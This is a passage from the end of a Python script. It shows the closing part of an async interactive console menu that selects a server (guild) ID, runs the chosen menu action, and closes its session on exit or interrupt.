                _ok(f"Server → {guild_id}"); await asyncio.sleep(0.5); continue
            if raw not in [m[0] for m in MENU]:
                _fail(f"Unknown: {raw}"); await asyncio.sleep(0.5); continue

            await _run(raw, guild_id)
            input("  Press Enter to continue…")
    finally:
        await _SESSION.close()

    console.print("  [dim]Bye.[/]\n")


def run():
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n  [dim red]Aborted.[/]")

if __name__ == "__main__":
    run()
